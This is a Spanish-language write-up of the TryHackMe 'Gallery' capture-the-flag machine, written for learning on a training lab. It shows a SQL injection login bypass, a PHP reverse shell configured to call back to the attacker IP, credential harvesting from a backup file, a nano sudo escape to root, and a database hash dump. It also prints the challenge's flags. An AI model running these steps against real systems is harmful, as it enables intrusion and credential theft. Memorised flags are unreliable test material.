# TryHackMe — Gallery | Writeup

> **Plataforma:** TryHackMe  
> **Máquina:** Gallery  
> **Dificultad:** Fácil  
> **OS:** Linux (Ubuntu)  
> **Flags:** `user.txt` ✅ | `root.txt` ✅

---

## 📡 Información del entorno

| | IP |
|---|---|
| Atacante | `192.168.198.163` |
| Víctima | `10.82.188.188` |

---

## 1. 🔍 Reconocimiento — Escaneo de puertos con Nmap

El primer paso es identificar qué servicios están corriendo en la máquina objetivo.

```bash
nmap -sV 10.82.188.188
```

**Resultado:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp   open  http    Apache httpd 2.4.41
8080/tcp open  http    Apache httpd 2.4.41
```

**Observaciones:**
- Puerto **22** → SSH (posible acceso posterior con credenciales)
- Puerto **80** → Servidor web Apache
- Puerto **8080** → Otro servidor web Apache — aquí encontramos un **panel de login**

---

## 2. 💉 Explotación — SQL Injection en el Login

Al acceder a `http://10.82.188.188:8080` encontramos un formulario de autenticación.

Probamos una inyección SQL básica para bypassear el login:

```
Usuario:   admin' or 1=1 -- -
Contraseña: (cualquier valor)
```

✅ El bypass funciona — accedemos al panel de administración.

---

## 3. 📁 Subida de archivo malicioso — PHP Reverse Shell

Dentro del panel notamos que existe una funcionalidad para **subir archivos**. Aprovechamos esto para subir una reverse shell en PHP.

### Descargamos la shell de PentestMonkey:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

### Configuramos el archivo con nuestros datos:

Editamos el archivo y modificamos las siguientes variables:

```php
$ip = '192.168.198.163';   // Nuestra IP atacante
$port = 2222;              // Puerto de escucha
```

### Ponemos a escuchar Netcat:

```bash
nc -lvnp 2222
```

### Subimos el archivo al servidor

Una vez subida y ejecutada la shell desde el navegador, recibimos la conexión:

```
connect to [192.168.198.163] from (UNKNOWN) [10.82.188.188]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ Tenemos acceso al sistema como **www-data**.

### Mejoramos la shell a una TTY interactiva:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

---

## 4. 🔐 Escalada de privilegios — Usuario Mike

### Buscamos información en el sistema de archivos

Explorando el sistema encontramos un backup del home de Mike en:

```bash
ls /var/backups/mike_home_backup/documents/
# accounts.txt
cat /var/backups/mike_home_backup/documents/accounts.txt
```

```
Spotify  : mike@gmail.com:mycat666
Netflix  : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

Revisamos también el `.bash_history` del backup:

```bash
cat /var/backups/mike_home_backup/.bash_history
```

```
sudo -lb3stpassw0rdbr0xx
```

🔑 **Contraseña sudo de Mike encontrada:** `b3stpassw0rdbr0xx`

### Cambiamos al usuario Mike:

```bash
su - mike
# Password: b3stpassw0rdbr0xx
```

### Leemos la primera flag:

```bash
cat /home/mike/user.txt
```

```
THM{af05cd30bfed67849befd546ef}
```

---

## 5. ⬆️ Escalada de privilegios — Root vía rootkit.sh

### Verificamos los permisos sudo de Mike:

```bash
sudo -l
```

```
User mike may run the following commands on ip-10-81-131-7:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

Mike puede ejecutar `/opt/rootkit.sh` como root **sin contraseña**.

### Analizamos el script:

```bash
cat /opt/rootkit.sh
```

```bash
#!/bin/bash
read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

case $ans in
    versioncheck)  /usr/bin/rkhunter --versioncheck ;;
    update)        /usr/bin/rkhunter --update ;;
    list)          /usr/bin/rkhunter --list ;;
    read)          /bin/nano /root/report.txt ;;
    *)             exit ;;
esac
```

La opción `read` abre **nano** como root para leer `/root/report.txt`. Podemos aprovechar nano para ejecutar comandos arbitrarios.

### Ejecutamos el script como root:

```bash
sudo /bin/bash /opt/rootkit.sh
# Respondemos: read
```

### Escape de nano → Shell root

Dentro de nano usamos los siguientes atajos:

1. `Ctrl + R` → Leer archivo
2. `Ctrl + X` → Ejecutar comando
3. Ingresamos: `reset;bash 1>&0 2>&0`

✅ Obtenemos una shell como **root**:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Leemos la flag de root:

```bash
cat /root/root.txt
```

```
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

---

## 6. 🗄️ Bonus — Acceso a la base de datos (MariaDB)

### Detectamos el servicio MySQL corriendo

Una vez dentro del sistema, verificamos si había algún servicio de base de datos activo:

```bash
ps aux | grep mysql
```

```
mysql    788  0.1  4.0 1731496 80784 ?  Ssl  22:16  0:00 /usr/sbin/mysqld
```

✅ Confirmamos que **mysqld está corriendo** como servicio activo. Con acceso root podemos conectarnos directamente sin credenciales.

### Accedemos a la base de datos:

```bash
mysql
```

```sql
show databases;
use gallery_db;
select username, password from users;
```

```
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | a228b12a08b6527e7978cbe5d914531c |
+----------+----------------------------------+
```

El hash es MD5 y puede crackearse con herramientas como CrackStation o Hashcat.

---

## 🏁 Resumen de Flags

| Flag | Valor |
|------|-------|
| 🧑 user.txt | `THM{af05cd30bfed67849befd546ef}` |
| 👑 root.txt | `THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}` |

---

## 🛠️ Herramientas utilizadas

| Herramienta | Uso |
|---|---|
| `nmap` | Reconocimiento de puertos y servicios |
| SQL Injection | Bypass del panel de login |
| `php-reverse-shell` (PentestMonkey) | Reverse shell via file upload |
| `netcat` | Listener para recibir la shell |
| `nano` escape | Escalada de privilegios a root |
| `mysql` | Extracción de credenciales de la BD |

---

## 📚 Lecciones aprendidas

- Los paneles de login sin sanitización son vulnerables a **SQL Injection básica**.
- Las funcionalidades de subida de archivos sin validación permiten **Remote Code Execution**.
- Los **archivos de backup** con permisos abiertos pueden filtrar información sensible.
- Los scripts ejecutados con `sudo` que invocan editores de texto interactivos (como `nano`) pueden ser abusados para obtener una shell privilegiada (**GTFOBins**).

---

*Writeup by: [Tu nombre/usuario] | TryHackMe: [tu perfil THM]*
